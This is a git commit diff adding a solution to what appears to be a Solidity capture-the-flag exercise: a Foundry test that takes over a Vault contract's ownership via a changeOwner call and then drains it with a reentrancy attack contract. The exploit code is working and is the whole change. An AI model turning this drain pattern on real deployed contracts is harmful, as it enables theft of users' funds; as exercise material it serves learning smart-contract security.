7cc4246f3f4fe8ea48ca817414a352eb1a107a8e
wudi <532787678@qq.com>
2025-05-22 13:22:07 +0800

    feat: add attack

--- test/Vault.t.sol
+++ test/Vault.t.sol
@@ -4,8 +4,26 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "../src/Vault.sol";
 
-
-
+contract ReentrancyAttack {
+    Vault private vault;
+    
+    constructor(address payable _vaultAddress) {
+        vault = Vault(_vaultAddress);
+    }
+    
+    function attack() external payable {
+        vault.deposite{value: msg.value}();
+        vault.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+    
+    // 重入攻击
+    receive() external payable {
+        if (address(vault).balance > 0) {
+            vault.withdraw();
+        }
+    }
+}
 
 contract VaultExploiter is Test {
     Vault public vault;
@@ -25,15 +43,25 @@ contract VaultExploiter is Test {
         vm.stopPrank();
 
     }
-
+    
     function testExploit() public {
         vm.deal(palyer, 1 ether);
         vm.startPrank(palyer);
 
-        // add your hacker code.
+        // 首先修改合约owner
+        bytes32 logicAddress = bytes32(uint256(uint160(address(logic))));
+        
+        (bool success,) = address(vault).call(
+            abi.encodeWithSignature("changeOwner(bytes32,address)", logicAddress, palyer)
+        );
+        
+        vault.openWithdraw();
+
+        ReentrancyAttack attacker = new ReentrancyAttack(payable(address(vault)));
+        
+        attacker.attack{value: 0.01 ether}();
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
     }
-
 }
